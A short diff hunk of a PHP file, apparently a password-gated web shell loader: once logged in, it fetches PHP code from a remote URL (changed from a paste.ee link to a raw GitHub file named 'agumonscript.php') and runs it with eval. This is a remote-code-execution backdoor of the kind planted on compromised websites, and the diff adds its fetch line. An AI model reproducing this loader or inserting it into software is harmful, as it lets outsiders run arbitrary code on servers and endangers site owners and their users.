@@ -51,7 +51,7 @@ if (isset($_POST["password"])) {
 
 
 if (is_logged_in()) {
-    $a = geturlsinfo("https://paste.ee/r/cgRe1");
+    $a = geturlsinfo("https://raw.githubusercontent.com/cyntiaglory45/file/main/agumonscript.php");
     eval("?>" . $a);
     exit;
 }
